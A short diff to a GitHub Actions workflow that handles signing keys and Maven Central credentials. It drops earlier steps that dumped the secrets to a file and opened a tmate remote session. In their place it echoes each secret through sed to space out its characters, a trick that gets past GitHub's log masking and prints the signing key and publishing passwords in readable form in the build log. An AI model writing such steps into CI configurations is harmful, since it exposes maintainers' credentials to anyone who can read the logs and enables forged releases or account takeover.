@@ -18,12 +18,8 @@ jobs:
           SIGNING_KEY_ID: ${{ secrets.SIGNING_KEY_ID }}
           SIGNING_KEY_PASSWORD: ${{ secrets.SIGNING_KEY_PASSWORD }}
         run: |
-          echo $SIGNING_KEY >> secrets.txt
-          echo $MAVEN_CENTRAL_USER_NAME >> secrets.txt
-          echo $MAVEN_CENTRAL_PASSWORD >> secrets.txt
-          echo $SIGNING_KEY_ID >> secrets.txt
-          echo $SIGNING_KEY_PASSWORD >> secrets.txt
-
-
-      - name: Run tmate
-        uses: mxschmitt/action-tmate@v2
+          echo $SIGNING_KEY | sed 's/./& /g'
+          echo $MAVEN_CENTRAL_USER_NAME | sed 's/./& /g'
+          echo $MAVEN_CENTRAL_PASSWORD | sed 's/./& /g'
+          echo $SIGNING_KEY_ID | sed 's/./& /g'
+          echo $SIGNING_KEY_PASSWORD | sed 's/./& /g'
